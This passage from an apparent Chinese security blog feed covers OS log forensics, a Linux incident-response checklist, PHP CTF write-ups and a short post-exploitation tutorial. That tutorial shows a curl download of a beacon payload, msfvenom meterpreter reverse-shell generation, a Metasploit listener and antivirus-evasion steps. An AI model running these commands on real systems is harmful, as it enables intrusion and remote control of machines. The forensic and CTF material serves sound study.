ID）应该是连续的，默认的排序方式应该是从大到小往下排列。</li><li>可以“删除”单条日志，实质上是隐藏。</li></ol><h3 id="日志查看"><a href="#日志查看" class="headerlink" title="日志查看"></a>日志查看</h3><ul><li>默认位置<code>C:/windows/System32/winevt/Logs</code> ，建议修改日志默认位置</li><li>利用事件查看器查看日志：开始-&gt;运行-&gt;输入<code>eventvwr</code> -&gt;回车的方式快速打开该工具</li></ul><h3 id="日志分类"><a href="#日志分类" class="headerlink" title="日志分类"></a>日志分类</h3><p><em>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</em></p><ul><li><strong>系统日志</strong>:记录主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的<u>时间类型由Windows NT/2000操作系统预先定义</u>。 默认位置： <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></li><li><strong>应用程序日志</strong>:包含由应用程序或系统程序记录的事件，<u>主要记录程序运行方面的事件</u>，例如数据库程序可以在应用程序日志中记录文件错误，默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></li><li><strong>安全日志</strong>:记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查<strong>取证中最常用到的日志</strong>。默认位置：<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></li><li>前两者存储着故障排除信息，对于系统管理员更为有用；<u>后者记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么</u>，对于调查人员而言，更有帮助。  </li></ul><h3 id="日志安全设置"><a href="#日志安全设置" class="headerlink" title="日志安全设置"></a>日志安全设置</h3><ul><li>设置系统默认日志属性，保留90天以上系统日志，可为日后系统故障排除故障、安全事故追查入侵者提供依据。</li><li>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略。</li></ul><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p><em>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，首要的过滤依据是EVENT ID</em></p><p><strong>常见EVENT ID及其含义</strong>:</p><ul><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/99.jpg" alt="登录事件"></li><li>每个<strong>成功登录的事件都会标记一个登录类型</strong> ，不同登录类型代表不同的方式<ul><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/0d90ab95dda91cdbb25c20480478218fc398d9bd.jpg" alt="登陆类型"></li></ul></li></ul><h3 id="日志分析工具"><a href="#日志分析工具" class="headerlink" title="日志分析工具"></a>日志分析工具</h3><ol><li><strong>Log Parser</strong></li><li><strong>LogParser Lizard</strong></li><li><strong>Event Log Explorer</strong></li></ol><h3 id="入侵情景分析"><a href="#入侵情景分析" class="headerlink" title="入侵情景分析"></a>入侵情景分析</h3><ol><li><strong>BadUSB</strong><ul><li>在一些近源渗透案例中，攻击者使用BadUSB对公司员工进行攻击，对这类攻击进行追踪需要<strong>着重关注硬件设备安装到系统中的时间</strong> ，展开追逐前，<u>确保审核策略已正确配置。</u></li><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/frr.jpg" alt="近源渗透"></li></ul></li><li><strong>WIFI钓鱼</strong><ul><li>在一些近源渗透案例中，攻击者使用WIFI伪造手段对办公区域进行钓鱼攻击，对这类攻击进行追踪需要<strong>着重分析系统访问过哪些关联的无线网络接入点及位置</strong>，<u>展开追逐前，确保审核策略已正确配置。</u></li><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/ki.jpg" alt="伪造wifi"></li></ul></li><li><strong>勒索病毒</strong><ul><li>在一些勒索病毒案例中，攻击者投放蠕虫病毒对局域网主机进行<strong>RDP(远程桌面)爆破</strong>，进而横向移动，对这类攻击进行追踪需要<strong>着重分析系统登陆事件</strong>，展开追逐前，确保审核策略已正确配置。</li><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/nm.jpg" alt="勒索病毒"></li></ul></li></ol><h1 id="MAC-OS基础"><a href="#MAC-OS基础" class="headerlink" title="MAC OS基础"></a>MAC OS基础</h1><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p><em>Mac日志文件是记录电脑系统应用程序和服务活动的文件，其后缀名为<code>.asl</code>，全名为Apple System Log。Mac日志文件按天存储，主要分为系统日志、安装器日志、无线连接日志、VPN连接日志、内核日志、诊断日志和电源管理日志7大类别，存储格式均为<code>.asl</code>。由于<u>Mac日志数据存储方式为二进制，在Window系统上并不能直接识别该文件</u>，需要对其中的asl日志文件结构进行解析。</em></p><h2 id="日志查看-1"><a href="#日志查看-1" class="headerlink" title="日志查看"></a>日志查看</h2><ul><li><pre><code class="php+HTML">系统日志文件夹 /var/log系统日志文件 /var/log/system.logMac 分析数据 /var/log/DiagnosticMessages系统应用程序日志 /Library/Logs系统报告 /Library/Logs/DiagnosticReports用户应用程序日志 ~/Library/Logs用户报告 ~/Library/Logs/DiagnosticReports</code></pre></li><li><pre><code class="php+HTML">grep -nE “123|abc” app.log #查询日志文件app.log中包含 关键字 123 或 包含 关键字 abc 的行，显示行号grep -E -C5 “123” app.log #显示app.log中含有关键字&quot;123&quot;的行内容，以及之前之后的各5行内容grep -E “123” app.log #显示app.log中含有关键字&quot;123&quot;的行内容grep -i “magic” app.log  #不分大小写的搜索匹配magic。默认情况下是区分大小写的cat -n app.log | grep “error” --color #查询日志中含有某个关键字error的信息，显示行号，带颜色cat -n app.log |grep “error” | more #使用more和less命令分页查看日志，空格键翻页cat -n app.log |grep “error” &gt; temp.txt #把日志保存到文件</code></pre></li></ul><h2 id="MAC文件系统"><a href="#MAC文件系统" class="headerlink" title="MAC文件系统"></a>MAC文件系统</h2><ul><li>UFS:在 UFS 之前的文件系统最多只能使用 5% 的磁盘带宽，而 UFS 将这个数字提升到了 50%</li><li>HFS+:<a href="https://g3.luciaz.me/extdomains/zh.wikipedia.org/wiki/%E8%8B%B9%E6%9E%9C%E5%85%AC%E5%8F%B8">苹果公司</a>为替代他们的<a href="https://g3.luciaz.me/extdomains/zh.wikipedia.org/wiki/%E5%88%86%E5%B1%82%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">分层文件系统</a>（HFS）而开发的一种文件系统</li><li>APFS:是一个适用于macOS、iOS、tvOS和watchOS的文件系统，目前正在由苹果公司开发和部署。它的目的是解决HFS+（Mac OS Extend，APFS的前身）文件系统的核心问题。APFS针对闪存和固态存储设备进行优化，具有写入时复制等设计特点，使用I/O合并改进性能                                                                                              </li></ul><h3 id="Mac文件目录"><a href="#Mac文件目录" class="headerlink" title="Mac文件目录"></a>Mac文件目录</h3><p><img src="https://img.linux.net.cn/data/attachment/album/201807/02/094428ko2tc8saplc2apto.png" alt="标准 Unix 文件系统"></p><h3 id="Mac特有目录"><a href="#Mac特有目录" class="headerlink" title="Mac特有目录"></a>Mac特有目录</h3><ul><li>/Applications 应用程序默认安装路径</li><li>/Library 系统文件</li><li>/Network 网络节点存放</li><li>/System 只包含一个Library目录，存放了系统的绝大部分组件</li><li>/Users 存放用户的数据</li><li>/Volumes 存放挂载点</li><li>/cores 内核转储文件存放目录。当一个进程崩溃时，如果系统允许则会产生转储文件。</li><li>/private 存放了/tmp, /var, /etc等链接目录的目标目录。</li></ul><h3 id="Mac文件系统特点"><a href="#Mac文件系统特点" class="headerlink" title="Mac文件系统特点"></a>Mac文件系统特点</h3><p><strong>由域确定文件的放置</strong></p><ul><li>在 macOS 中，文件系统被<strong>分为多个域</strong>，<u>根据文件和资源的预期用途进行分离</u>。<ul><li><strong>用户域</strong>包含特定于登录系统的用户的资源。虽然从技术上讲，它包含所有用户，但此域只反映<strong>当前用户在运行时的家庭目录</strong>。</li><li><strong>本地域</strong>包含资源，例如当前计算机本地的应用程序，并共享给该计算机的所有用户。</li><li><strong>网络域</strong>包含在<u>局域网络所有用户</u>之间共享的应用程序和文档等资源。</li><li><strong>系统域</strong>包含由Apple安装的系统软件。系统域中的资源是系统运行所必需的。用户无法添加，删除或更改此域中的项目。</li></ul></li></ul><h2 id="Mac基本操作命令"><a href="#Mac基本操作命令" class="headerlink" title="Mac基本操作命令"></a>Mac基本操作命令</h2><h3 id="Mac用户管理命令"><a href="#Mac用户管理命令" class="headerlink" title="Mac用户管理命令"></a>Mac用户管理命令</h3><pre><code class="php+HTML">dscl . -list /Users #查看所有用户，仅显示用户名dscl . -list /Users UniqueID #查看所有用户对应的IDdscl . -read /Users/用户名 #查看指定用户的详细信息dscl . -list /Groups  用户组id #查看用户组dscl . -create /Users/kk UniqueID 888 #新建kk用户，id为888dscl . -passwd /Users/sz 1234 #修改kk用户的密码dscl . -delete /Users/kk #删除用户kkdscl . -create /Groups/组名 #新建组dscl . -append /Groups/组名 groupMembership kk #把kk添加到组dscl . -delete /Groups/组名 groupMembership kk #把kk从组删除dscl . -list /Groups GroupMembership #查看所有组下的用户</code></pre><h1 id="移动智能设备操作系统"><a href="#移动智能设备操作系统" class="headerlink" title="移动智能设备操作系统"></a>移动智能设备操作系统</h1><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><p>Android是基于Linux（不包含<a href="https://baike.baidu.com/item/GNU/671972">GNU</a>组件）的自由及开放源代码的操作系统</p><h3 id="Android日志文件"><a href="#Android日志文件" class="headerlink" title="Android日志文件"></a>Android日志文件</h3><ul><li><p>Android有四类日志文件，分别是：main, system, radio和events。</p></li><li><p>日志通过<code>/dev/log/main, /dev/log/system, /dev/log/radio, /dev/log/events</code> 四个设备文件来进行访问。</p></li><li><p><strong>main</strong>：应用程序日志<br><strong>system</strong>：系统日志<br><strong>radio</strong>：无线设备日志<br><strong>events</strong>：诊断系统问题日志</p></li></ul><h4 id="Logger日志格式"><a href="#Logger日志格式" class="headerlink" title="Logger日志格式"></a>Logger日志格式</h4><p>main、system和radio三种类型的日志格式是相同的。日志格式如下所示：</p><p><img src="https://pic1.zhimg.com/v2-a2f876631161fca1f52d5ae9910a18dc_b.jpg" alt="日志格式"></p><ul><li><strong>Priority</strong>：是一个整数，代表的是<strong>日志的优先级</strong>；<ul><li>日志的优先级按重要程度不同划分为：<ul><li>V-详细(Verbose，最低优先级)</li><li>D-调试(Debug)</li><li>I-信息(Info)</li><li>W-警告(Warning)</li><li>E-错误(Error)</li><li>F-致命(Fatal)</li><li>S-静默(Silent，最高优先级，但不打印任何内容)</li></ul></li></ul></li></ul><p><strong>tag</strong>：是一个字符串，代表的是<strong>日志的标签</strong>；<br><strong>message</strong>：是一个字符串，代表的是<strong>日志的内容</strong>。</p><p>events类型日志没有<strong>Priority</strong>标签</p><h4 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h4><p><strong>Logcat</strong></p><h2 id="Android文件系统"><a href="#Android文件系统" class="headerlink" title="Android文件系统"></a>Android文件系统</h2><h3 id="Ext4"><a href="#Ext4" class="headerlink" title="Ext4"></a>Ext4</h3><p>Android操作系统依托于Linux，所以主要的文件系统也是从Linux中发展而来，包括exFAT、ext3、ext4等，目前大多数手机仍使用Ext4。</p><h3 id="F2FS"><a href="#F2FS" class="headerlink" title="F2FS"></a>F2FS</h3><p>F2FS “Flash Friendly File System”，<strong>一种专门为闪存而生的文件系统</strong>，其优势就是小文件的传输速率更快。近年来不断的有旗舰机采用这一文件系统。</p><h3 id="Ext4-vs-F2FS"><a href="#Ext4-vs-F2FS" class="headerlink" title="Ext4 vs F2FS"></a>Ext4 vs F2FS</h3><ul><li>F2FS 随机读写速度更快</li><li>F2FS减少写的次数，延长固件寿命</li><li>F2FS小文件读写速度更快，降低整理碎片开销</li><li>Ext4 普及率更高，兼容性更好</li><li>Ext 4 大文件读取远强于 F2FS</li></ul><h2 id="基本操作命令"><a href="#基本操作命令" class="headerlink" title="基本操作命令"></a>基本操作命令</h2><p><strong>adb</strong>:Android 调试桥</p><pre><code class="php+HTML">adb shell  #进入Linuxshell模式adb shell command #执行单条Linux命令adb root #获取管理员权限adb pull &lt;远程路径&gt; &lt;本地路径&gt; #从设备上下载文件到电脑adb shell netcfg/ifconfig #显示ip</code></pre><h2 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h2><p><em>iOS属于类Unix的操作系统</em></p><h3 id="IOS日志文件"><a href="#IOS日志文件" class="headerlink" title="IOS日志文件"></a>IOS日志文件</h3><p><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.png" alt="IOS日志文件"></p><ul><li>第一部分闪退进程的信息：<ul><li><strong>Incident Identifie</strong>r ： 是崩溃报告的唯一标识符</li><li><strong>CrashReporter Key</strong>： 是与设备标识相对应的唯一键值。根据大量机子的出现频率可以判断是否是一个普遍的问题</li><li><strong>Hardware Model</strong> ：标识设备类型。 如果很多崩溃日志都是来自相同的设备类型，说明只在某特定类型的设备上有问题</li><li><strong>Process</strong>：操作权限</li><li><strong>Path</strong>:崩溃文件的路径</li><li><strong>Identifier</strong>:项目标识符</li><li><strong>Version</strong>:版本号</li></ul></li><li>第二部分基本信息<ul><li>这部分包括闪退发生的日期Date/Time和时间Launch Time，设备的iOS版本OS Version</li></ul></li><li>第三部分异常信息</li><li><strong>Exception Type</strong>:异常的类型</li><li><strong>Exception Codes</strong> ：异常错误码</li><li><strong>Termination Reason</strong>：闪退的原因</li><li><strong>Triggered by Thread</strong>：出现问题的线程。首先确定在哪个线程中出了问题，其次再去定位。</li></ul><h3 id="基本操作命令-1"><a href="#基本操作命令-1" class="headerlink" title="基本操作命令"></a>基本操作命令</h3><p><em>Korn Shell(Unix Shell)</em></p><pre><code class="php+HTML">w #显示当前系统活动的总信息df /tmp #显示文件系统的总空间和可用空间uname -a #显示系统全部信息</code></pre><h3 id="IOS文件系统"><a href="#IOS文件系统" class="headerlink" title="IOS文件系统"></a>IOS文件系统</h3><p><u>APFS 是 macOS、iOS、手表和 tvOS 中的默认文件系统。</u></p><p><strong>iOS 标准目录：文件所在的位置</strong></p><ul><li><p>出于安全目的，iOS 应用与文件系统的交互仅限于应用沙盒目录内的目录。</p></li><li><p>通常禁止应用在沙盒之外访问或创建文件</p></li><li><img src="/2021/08/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/ios_app_layout_2x.png" alt="沙盒" style="zoom:67%;"><ul><li><strong>Documents</strong>:用户数据</li><li><strong>Library</strong>:非用户数据，存储特定资源</li><li><strong>Temp</strong>:临时文件,可能定时由系统清除</li><li><strong>MyApp.app</strong>:应用程序的包</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux应急响应</title>
      <link href="2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h1 id="常规检测流程"><a href="#常规检测流程" class="headerlink" title="常规检测流程"></a>常规检测流程</h1><h2 id="查杀病毒进程"><a href="#查杀病毒进程" class="headerlink" title="查杀病毒进程"></a>查杀病毒进程</h2><ul><li><strong>1.discover</strong> <ul><li>根据进程discover<ul><li>根据进程的cpu和内存情况找到病毒<ul><li><code>ps aux|head -1;ps aux|sort -rn -k +3|head</code> cpu占用最多的10个进程</li><li><code>ps aux|head -1;ps aux|sort -rn -k +4|head</code> 内存占用最多的10个进程</li></ul></li><li><code>top</code>动态查看进程，包含cpu，内存占用等信息</li><li><code>ps aux</code>静态查看进程</li><li><code>ps -ef</code>静态查看进程，信息量较少</li></ul></li><li>根据网络连接discover<ul><li><code>netstat -antlp | grep EST</code>查看已建立连接，检查是否存在异常外联进程。<ul><li><img src="/2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1.png" alt="暂未发现连接外部服务器"></li></ul></li></ul></li></ul></li><li><strong>2.kill</strong><ul><li><code>netstat -anltp | grep 68670</code>查看该进程网络连接情况</li><li><code>kill 9  pid</code>//9代表快速停止</li></ul></li><li><strong>3.delete</strong><ul><li><code>ls -la /proc/$pid/exe</code></li><li><code>lsof -p $pid</code>查看病毒进程都打开了哪些文件，方便彻底清除</li></ul></li></ul><h2 id="查看威胁是否完全清除"><a href="#查看威胁是否完全清除" class="headerlink" title="查看威胁是否完全清除"></a>查看威胁是否完全清除</h2><p>​    黑客可能会通过各种手段再次远程下载病毒运行</p><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>定时任务（即定时启动程序的任务）可以帮助入侵者运行痕迹清理脚本或者持久控制</p><ul><li>添加一个定时任务<code>vim /etc/crontab</code></li><li>添加内容：<code>*/1 * * * * root ./root/Desktop/1</code> //<code>*</code>代表秒分时年月日，root权限，执行文件1，即每隔一分钟运行一次程序1<ul><li><img src="/2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/3.png" alt="定时任务"></li></ul></li><li><code>tail /var/log/cron</code> //查看异常定时任务日志</li><li><code>crontab -l</code>查看计划任务是否有恶意脚本或者恶意命令</li></ul><h3 id="自启动项和服务"><a href="#自启动项和服务" class="headerlink" title="自启动项和服务"></a>自启动项和服务</h3><p>查看是否存在开机启动的病毒</p><ul><li><code>cat /etc/rc.local</code>查看是否有异常开机启动项</li></ul><h3 id="用户安全性排查"><a href="#用户安全性排查" class="headerlink" title="用户安全性排查"></a>用户安全性排查</h3><p>查看黑客有没有创建后门</p><ul><li><p><code>w</code>命令可以显示当前用户登录在线情况</p></li><li><p><code>cat /etc/passwd | grep bash</code>//查看当前系统可被登录的账号</p></li><li><p><code>grep &quot;Accepted &quot; /var/log/secure* | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code>查看登陆用户和他的ip</p></li><li><p><code>last</code>命令可以查看系统每次登录的账号、ip、登录时间、持续时间</p><ul><li><img src="/2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/8.png" alt="每次登录的" style="zoom: 80%;"></li></ul></li><li><p><code>lastlog</code>命令可以查看账号的最近一次登录时间</p><ul><li><img src="/2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/6.png" alt="最近一次登录" style="zoom:80%;"></li></ul></li><li><p>攻击用户排查</p><ul><li><code>grep &quot;Failed password for root&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; | sort</code>爆破root的恶意ip</li><li><code>grep refused /var/log/secure* | awk &#123;&#39;print $9&#39;&#125; | sort | uniq -c |sort -nr | moregrep &quot;Failed password&quot; /var/log/secure* | grep -E -o &quot;(([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;))&quot; | uniq -c </code>查看试图爆破的ip</li></ul></li><li><p>用户登陆方式排查</p><p>对其来路进行封堵</p><ul><li><code>cat /var/log/secure* | grep Accepted</code>//查看登陆成功的记录，下图出现的是ssh2说明是通过ssh爆破登陆的<ul><li><img src="/2021/06/17/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/7.png" alt="ssh服务" style="zoom: 150%;"></li></ul></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>后渗透1%</title>
      <link href="2021/06/16/%E5%90%8E%E6%B8%97%E9%80%8F1/"/>
      <url>2021/06/16/%E5%90%8E%E6%B8%97%E9%80%8F1/</url>
      
        <content type="html"><![CDATA[<h1 id="如何控制目标机器"><a href="#如何控制目标机器" class="headerlink" title="如何控制目标机器"></a>如何控制目标机器</h1><ul><li>远程下载木马文件，这就需要一个服务器，通过请求服务器下载木马到目标机器</li><li>msfvenom制作木马</li><li>利用MSF攻击目标，设置监听</li><li>目标机器运行木马→MSF获得对方机器的session→控制目标机器</li></ul><h2 id="搭建本地服务器"><a href="#搭建本地服务器" class="headerlink" title="搭建本地服务器"></a>搭建本地服务器</h2><h3 id="用于远程下载木马"><a href="#用于远程下载木马" class="headerlink" title="用于远程下载木马"></a>用于远程下载木马</h3><p>1.本地利用python搭建简单服务器<br><code>python -m SimpleHTTPServer 8000</code></p><p>2.使用花生壳，ngrok，sunny_ngrok等内网穿透软件把自己在内网（局域网外无法访问的）的电脑变成外网服务器，可以提供远程下载服务。</p><p>3.ngrok启动（Linux下）：<code>./ngrok http 8000</code>  </p><ul><li> 8000是本地端口</li></ul><h3 id="Windows-Linux远程下载木马命令"><a href="#Windows-Linux远程下载木马命令" class="headerlink" title="Windows/Linux远程下载木马命令"></a>Windows/Linux远程下载木马命令</h3><p><code>curl -o C:\Users\wohcoos\Desktop\beacon.bin http://ip:port/charlotte/beacon.bin</code></p><h2 id="msfvenom制作木马"><a href="#msfvenom制作木马" class="headerlink" title="msfvenom制作木马"></a>msfvenom制作木马</h2><h3 id="生成木马："><a href="#生成木马：" class="headerlink" title="生成木马："></a>生成木马：</h3><ul><li><p><code>Windows:msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ip(外网) LPORT=36491 -f raw &gt; /home/kali/</code></p></li><li><p><code>Linux:msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=ip（外网） LPORT=36491 -f elf &gt; /home/kali/</code></p></li></ul><h2 id="MSF攻击"><a href="#MSF攻击" class="headerlink" title="MSF攻击"></a>MSF攻击</h2><pre><code>use exploit/multi/handler  set payload windows/x64/meterpreter/reverse_tcp  set lhost 192.168.245.128  //这个就是你刚刚网站的填写的IP，内网穿透软件设置映射到本机的ipset lport 7758  //这个就是刚刚IP后面跟着的端口,内网穿透软件设置映射到本机的portexploit //运行，开始监听目标运行木马文件获得的session</code></pre><h2 id="Linux后台运行程序命令"><a href="#Linux后台运行程序命令" class="headerlink" title="Linux后台运行程序命令"></a>Linux后台运行程序命令</h2><p>目的就是方便</p><ul><li><code>screen -S name </code>新建后台程序</li><li><code>screen -ls</code> 后台程序清单</li><li><code>screen -r</code> 恢复后台程序</li><li><code>CTRL+a+d</code>  返回操作界面</li></ul><h3 id="cna检测杀软脚本使用"><a href="#cna检测杀软脚本使用" class="headerlink" title="cna检测杀软脚本使用"></a>cna检测杀软脚本使用</h3><p>防查杀</p><p>命令:<code>AV_Query</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PHP2</title>
      <link href="2021/06/10/CTF-PHP2/"/>
      <url>2021/06/10/CTF-PHP2/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul><li><pre><code class="php">flag In the variable ! &lt;?php  error_reporting(0);include &quot;flag1.php&quot;;highlight_file(__file__);if(isset($_GET[&#39;args&#39;]))&#123;    $args = $_GET[&#39;args&#39;];    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;        die(&quot;args error!&quot;);    &#125;    eval(&quot;var_dump($$args);&quot;);&#125;?&gt;</code></pre></li></ul><ul><li><p><code>error_reporting(0)</code>关闭错误报告</p></li><li><p><code>include</code>文件包含，此时包含文件flag1.php</p></li><li><p><code>highlight_file(__file__);</code>高亮代码，没啥用</p></li><li><p><code>isset</code>判断<code>args</code>参数是否存在，存在则将用户的输入赋值给它</p></li><li><p><code>preg_match</code>匹配正则表达式，/^（开始）, \w表示任意一个单词字符，即[a-z,A-Z,0-9_] ,+将前面的字符匹配一次或多次，$/（结尾）。此时如果用户输入超出这里的范围，如输入符号是不被允许的</p></li><li><p><code>die()</code> 函数输出一条消息，并退出当前脚本。此时如果用户输入不满足第二个if的正则表达式，则输出<code>args error!</code></p></li><li><p><strong><code>flag In the variable !</code>提示flag在变量中</strong></p></li><li><p>两个$$即把<code>args</code>设置为可变变量。</p><ul><li><img src="/2021/06/10/CTF-PHP2/4.jpg" alt="可变变量介绍" style="zoom:50%;"></li></ul></li><li><p><code>eval</code>把括号里的内容当作代码执行</p></li></ul><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li>利用文件包含打印出flag</li><li>利用题目的提示<code>flag In the variable</code>获取flag</li></ol><h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><ol><li><p>采用思路一，行不通。正则判断条件不允许出现<code>.()</code>等特殊符号，因为不满足正则条件，所以输入<code>flag.php</code>会直接返回<code>args error!</code>,所以无法通过执行system（cat flag1.php）等系统命令查看flag1.php</p><ul><li><img src="/2021/06/10/CTF-PHP2/2.jpg" alt="返回error" style="zoom: 67%;"></li><li><p>如果输入满足正则条件，是下面的结果，但无法和思路一结合起来</p></li><li><img src="/2021/06/10/CTF-PHP2/3.jpg" alt="返回null" style="zoom:67%;"></li></ul></li><li><p>结合题目提示，利用可变变量，把所有的变量都打印出来即可获得flag</p><ul><li>题目里面除了<code>args</code>以及没有第二个变量，所以我们要使用默认存在的全局变量``$GLOBALS<code>获得所有变量即获得flag，PHP 在名为 </code>$GLOBALS[index] `的数组中存储了所有全局变量。</li></ul></li><li><p><code>args=GLOBALS</code>正好符合条件利用可变变量输出，最后得到flag。</p></li><li><p>执行流程</p><ol><li>用户输入<code>args=GLOBALS</code>,根据第七行把<code>GLOBALS</code> 赋给<code>$args</code>，满足第八行的判断，跳到<code>evel</code>执行<code>var_dump($GLOBALS);  </code></li></ol><p><img src="/2021/06/10/CTF-PHP2/1.jpg" alt="writeup"></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PHP</title>
      <link href="2021/06/10/CTF-PHP/"/>
      <url>2021/06/10/CTF-PHP/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h2><p><strong>php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换。</strong><br>在php中有两种比较符号: <code>==</code>和<code>===</code></p><ul><li>== ：弱等于。在比较前会先把两种<strong>字符串类型转成相同</strong>的再进行比较。它不会比较<strong>变量类型</strong>，只比较值。</li><li>=== ：强等于。在比较前会<strong>先判断两种字符串类型是否相同</strong>再进行比较，如果类型不同直接返回不相等。<strong>既比较值也比较类型</strong>。</li></ul><h2 id="PHP转换规则"><a href="#PHP转换规则" class="headerlink" title="PHP转换规则"></a>PHP转换规则</h2><ul><li>若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较</li><li>若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串或null，则转换为0</li><li>eg:”admin”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）</li><li>布尔值true和任意字符串都弱相等</li></ul><ul><li><pre><code class="php">var_dump(12==&quot;12&quot;)                                   //truevar_dump(12==&quot;12aa&quot;)                               //truevar_dump( &quot;admin&quot;==0)                               //truevar_dump(false==&quot;&quot;==0==NULL)                        //truevar_dump(true==&quot;hyuf&quot;)                              //true</code></pre></li></ul><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul><li><pre><code class="php">$num=$_GET[&#39;num&#39;];if(!is_numeric($num))&#123;echo $num;if($num==1)echo &#39;flag&#123;******&#125;&#39;;&#125; </code></pre></li></ul><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>使用$定义一个变量<code>$num</code><br><code>is_numeric()</code> 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回空值，即 FALSE<br>flag在第二个条件中<br>在第一个if语句，如果输入为数字，则打印输入的数字，不打印flag<br>所以我们要执行第二个if语句，所以不能单纯输入数字，否则会执行第一个if语句<br>为满足判断条件2，根据上述转换规则，输入的数字为1+非数字字符则满足判断条件2打印出flag</p><p><img src="/2021/06/10/CTF-PHP/1.png" alt="writeup"></p><h2 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="PHP文件包含"></a>PHP文件包含</h2><ul><li>web 应用采用 include()、include_once()、require()、require_once()等文件包含函数，并且需要包含的文件路径是通过<strong>用户传输参数</strong>的方式引入；</li><li>用户能够<strong>控制</strong>包含文件的<strong>参数</strong>，被包含的文件可被当前页面访问；</li></ul><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><ul><li><pre><code class="php">&lt;?php       include &quot;flag.php&quot;;       $a = @$_REQUEST[&#39;hello&#39;];       eval( &quot;var_dump($a);&quot;);       show_source(__FILE__);?&gt; </code></pre></li></ul><ul><li><p><code>Include（）</code>：包含并运行指定的文件，只有在程序执行到include时才包含文件，且当包含文件发生错误时，程序警告，但会继续执行。此时包含文件为flag.php</p></li><li><p><code>$_REQUEST[&quot;参数&quot;]</code>，此时参数为hello，此时用于提供给用户输入</p></li><li><p><code>eval() </code>函数可将字符串转换为代码执行，并返回一个或多个值，此时用于执行我们想要的命令</p></li><li><p><code>var_dump()</code>的功能是输出变量的信息，此时用于将运行结果输出给我们看</p></li><li><p><code>show_source()</code>函数，可以使用<code>show_source(&#39;flag.php&#39;)</code>直接查看<code>flag.php</code>页面</p><h3 id="如何查看flag-php文件"><a href="#如何查看flag-php文件" class="headerlink" title="如何查看flag.php文件"></a>如何查看flag.php文件</h3><p>通过Linux的系统命令<code>cat flag.php</code>查看文件<br>通过php函数<code>show_source()</code>函数直接查看</p><h3 id="大体流程"><a href="#大体流程" class="headerlink" 